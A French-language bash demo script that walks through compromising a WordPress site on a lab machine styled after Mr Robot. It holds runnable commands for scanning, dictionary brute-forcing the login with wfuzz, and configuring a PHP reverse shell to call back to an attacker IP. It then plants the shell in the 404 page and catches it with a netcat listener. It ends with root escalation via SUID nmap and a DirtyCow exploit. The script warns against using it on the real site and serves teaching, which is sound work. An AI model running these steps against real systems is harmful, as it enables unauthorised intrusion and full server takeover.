#!/bin/bash

rb='\033[0;41m'
nb='\033[1;0m'
bn='\033[30;47m'
fnc='\033[0m'
eol=$'\x1B[K'

function rem {
	echo -e "\033[30;47m$@${eol}\e[m"
}

function prompt {
	echo -e "\033[01;31mroot@ATPattaquant\033[00m:\033[01;34m~\033[00m# $@"
}

function pause {
#	read -p "Presser une touche pour continuer... " -n1 -s
	read -p ". " -n1 -s
	rem
}

rem "Ceci est une démo, et notre cible est une machine de démo. Le site web en question existe dans la vraie vie, ne vous amusez pas à faire ça dessus !"
rem "###################################################################################################################################################"
rem
pause
rem
rem
rem " Votre cible, si vous l'acceptez, est la société USA Network, et ce site : ${rb} www.whoismrrobot.com ${bn}"
rem " Objectif : ${rb} compromettre ce site ${bn} et si possible ${rb} compromettre le serveur ${bn}."
rem " Petit rappel, c'est ce qui est arrivé à la chaîne TV5monde il y a quelque temps."
rem
pause
rem
rem "${rb} Les différentes phases ${bn}"
rem "${rb} Phase 1 : Reconnaissance : ${bn} Planification et reconnaissance de la cible, découverte passive/active"
rem
rem "${rb} Phase 2 : Scanning : ${bn} Identification des vulnerabilités, recensement des failles/vuln, découverte active via des outils"
rem
rem "${rb} Phase 3 : Attaque : ${bn} Exploitation des vulnérabilités et tentative d'accès grace aux éléments de la phase 1 et 2"
rem
rem "${rb} Phase 4 : Maintien des accès : ${bn} Se permettre de revenir, et élever ses privilères : ouverture d'une backdoor, prise de possession du serveur..."
rem
pause
rem
rem "${rb}===================================================================================================================================="
rem "${rb} PHASE 1 : Reconnaissance"
rem "${rb}===================================================================================================================================="
rem
rem " Nous allons voir le site."
rem " Faisons aussi ${rb} des recherches internet ${bn} pour récolter des ${rb} informations ${bn} sur notre cible. Une recherche dans Google \"whois MrRobot USA Network cast\", et on tombe sur ${rb} un trombinoscope ${bn}."
rem
pause
rem
rem "${rb}===================================================================================================================================="
rem "${rb} PHASE 2 : Scanning"
rem "${rb}===================================================================================================================================="
rem
rem " Au moyen d'${rb}outils${bn}, nous allons continuer à inventorier tout ce qui pourrait nous servir et qui va constituer notre ${rb} surface d'attaque ${bn}."
rem " ${nb} Nmap ${bn} nous permet de découvrir des ${rb} ports ouverts sur le serveur ${bn} hébergeant le site web."
rem
pause
rem
prompt nmap www.whoismrrobot.com
nmap www.whoismrrobot.com
rem
pause
rem
rem " On voit que ${rb} le port 80 HTTP et 443 HTTPS sont ouverts ${bn} sur internet et que le port 22 est peut-être ouvert mais aucun service n'y répond, on ne s'en occupera pas."
rem
pause
rem
rem " ${nb} wig, nikto, wpscan ${bn}... nous permettent d'identifier le ${rb} CMS utilisé ${bn}."
rem
pause
rem
prompt wig -n 1 http://www.whoismrrobot.com
wig -n 1 http://www.whoismrrobot.com
rem
pause
rem
prompt nikto -h http://www.whoismrrobot.com
cat <<EOF
- Nikto v2.1.6
------------------------------------------------------------------------------------------------------------------------------------------------------
+ Target IP:          192.168.43.195
+ Target Hostname:    www.whoismrrobot.com
+ Target Port:        80
+ Start Time:         2018-02-27 09:44:15 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://www.whoismrrobot.com/?p=23>; rel=shortlink
+ /readme.html: This Wordpress file reveals the installed version.
+ /wp-links-opml.php: This Wordpress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ 7521 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2018-02-27 09:51:13 (GMT-5) (418 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

EOF
rem
pause
rem
rem " Remarquez qu'il vient de trouver un fichier robots.txt, que le CMS est un Wordpress, et qu'il nous donne la page de login du CMS."
rem
pause
rem
rem " Allons sur la page de connexion."
rem
pause
rem
rem " On constate qu’il n’y a ${rb} pas de limitation des tentatives de connexion ${bn} ni ${rb} captcha ${bn}."
rem " On peut essayer des mots et des prénoms de personnes de la page \"Cast\". Essayez \"elliot\" : noter que ${rb} le message change selon le login ${bn}."
rem
pause
rem

rem
rem "${rb}===================================================================================================================================="
rem "${rb} PHASE 3 : Attaque"
rem "${rb}===================================================================================================================================="
rem
rem " ${rb} On passe à l'action ${bn} grace aux éléments découverts dans la phase 1 et 2."
rem " Le fichier robots.txt, comme pour ${rb} tous les sites web ${bn} ce fichier peut ${rb} servir mais aussi desservir ${bn}: il pourrait nous fournir des informations supplémentaires."
rem
pause
rem
prompt curl -O http://www.whoismrrobot.com/robots.txt
curl -O http://www.whoismrrobot.com/robots.txt
cat robots.txt
rem
pause
rem
rem " Le fichier robots.txt nous dévoile la présence de fichiers cachés. Le fichier ${rb} fsocity.dic ${bn} nous inspire."
rem " Il pourrait être ${rb} un fichier de travail ${bn} du système ou ${rb} une sauvegarde ${bn}."
rem
pause
rem
prompt curl -O http://www.whoismrrobot.com/fsocity.dic
curl -O http://www.whoismrrobot.com/fsocity.dic
mv fsocity.dic fsocity.dic.ORIG
cat fsocity.dic.ORIG | sort | uniq > fsocity2.dic
tail -n 50 fsocity2.dic
cat fsocity.dic.ORIG | grep -A 15 -B 15 'ER28-0652' > fsocity3.dic
rem
pause
rem
rem " En lisant ce fichier on dirait un ${rb} dictionnaire ${bn} de mot de passe ou de commandes, utilisons le pour une ${rb} attaque par dictionnaire ${bn} bien plus efficace qu'une attaque par ${rb} force brute ${bn}."
rem
pause
rem
rem " En parlant de dictionnaire : construisons-en un depuis la page du trombinoscope de tout à l'heure." 
rem " L'outil ${nb} cewl ${bn} va récupérer pour nous tous les mots clés de la page : on ne jette rien, au contraire on fait les poubelles..."
rem
pause
rem
prompt cewl -v -w mrrobot_user.txt -d 1 -m 6 http://www.usanetwork.com/mrrobot/cast
cewl -v -w mrrobot_user.txt -d 1 -m 6 http://www.usanetwork.com/mrrobot/cast
cat mrrobot_user.txt |sort | uniq > user.txt
cat user.txt | egrep -A 5 -B 5  'elliot|Elliot|Darlen|Angela|Dominique|Grace|Tyrel|tyrel|Joanna|joanna' |sort |uniq > user1.txt 

rem
pause
rem

rem " On a maintenant deux dictionnaires. On les utilise avec un outil qui va essayer toutes les combinaisons sur la page de connexion."
rem
pause
rem
prompt wfuzz -c -z file,user1.txt -z file,fsocity3.dic -d "log=FUZZ&pwd=FUZ2Z" --sc 302 http://www.whoismrrobot.com/wp-login.php
wfuzz -c -z file,user1.txt -z file,fsocity3.dic -d "log=FUZZ&pwd=FUZ2Z" --sc 302 http://www.whoismrrobot.com/wp-login.php

rem
pause
rem

rem "${rb} Bingo on a maintenant le login et le password d'un utilisateur !!! ${bn}"
rem " Avec de la chance cet utilisateur est administrateur et si jamais ça ne marche pas, on cherchera encore, ou bien on fera du social engineering par téléphone ou du phishing."
rem
pause
rem
rem " On va essayer ces identifiants sur le site, et vérifier que l'on est bien admin du WordPress."
rem
pause
rem
rem "${rb}===================================================================================================================================="
rem "${rb} PHASE 4 : Maintien des accès"
rem "${rb}===================================================================================================================================="
rem
rem " Pour l'instant on a juste accès à l'admin du site, mais ça ne suffit pas. Un webshell sur le site, ça serait pas mal, ça"
rem " On va chercher reverse shell sur internet"
rem
pause
rem
prompt wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
tar -zxf php-reverse-shell-1.0.tar.gz
cp php-reverse-shell-1.0/php-reverse-shell.php .
#IPattaque=`ip a | grep inet |grep -v 127 |awk -F' ' '{print $2}'|cut -d"/" -f1`
#sed -i -e 's/127.0.0.1/'$IPattaque'/g' php-reverse-shell.php
sed -i -e 's/127.0.0.1/192.168.43.196/g' php-reverse-shell.php
sed -i -e 's/1234/4455/g' php-reverse-shell.php
rem
pause
rem
cat php-reverse-shell.php
rem
pause
rem
rem " Alors comment mettre ce code pour qu'il marche à coup sûr ? Quelle page, facile à accéder, que tous les sites web possèdent, et dont le vrai administrateur du site se moque et où il ne va que très rarement, voir pas du tout ?"
rem
pause
rem
rem " Et oui : on va utiliser la page 404..."
rem " On copie colle le bout de code, on vérifie les paramètres : adresse IP de l'attaquant et le port."
rem " On va mettre maintenant en écoute le pc de l'attaquant."
rem
pause
rem " ${rb}Interrompre le script pour faire la suite à la main."
pause
rem
prompt nc -lvp 4455
#nc -lvp 4455
rem
pause
rem
rem " On appelle la page 404 du site et la connexion s'établit avec le pc de l'attaquant."
rem " On lance un prompt via la commande : "
prompt python -c "import pty; pty.spawn('/bin/bash');"
rem " Une fois sur le prompt on lance une recherche sur les fichier avec une perm 4000 (donc suid en root)."
prompt find / -perm -u=s -type f \2\>/dev/null
#ou find / -perm 4755 -type f 2>/dev/null
rem " On obtient une liste avec entre autre un nmap, cool !!! Car on sait qu'il y a une faille facile avec nmap."
rem
rem " On lance alors :"
prompt "nmap --interactive"
prompt "nmap>!sh"
prompt "!sh"
prompt "id"
rem " et bim on est root."
rem

pause
rem

rem " On peut aussi aller plus loin, grace à une vulnérabilité que l'on a trouvé dans la phase 2 : la version du kernel. Grâce à elle on trouve que le serveur est vulnérable à la ${rb} faille DirtyCow."

rem
pause
rem

cat <<EOF
# wget https://www.exploit-db.com/download/40847.cpp
wget https://www.exploit-db.com/download/40847.cpp
--2018-02-04 19:53:51--  https://www.exploit-db.com/download/40847.cpp
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/txt]
Saving to: '40847.cpp'

    [ <=>                                   ] 10,531      --.-K/s   in 0.002s

2018-02-04 19:53:52 (6.69 MB/s) - '40847.cpp' saved [10531]

# g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
# ls
ls
40847.cpp  dcow  home	     lib64	 mnt   root  srv  usr
bin	   dev	 initrd.img  lost+found  opt   run   sys  var
boot	   etc	 lib	     media	 proc  sbin  tmp  vmlinuz
# chmod 755 dcow
chmod 755 dcow
# ./dcow
./dcow
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
# su -
su -
Password: dirtyCowFun

EOF

exit 0
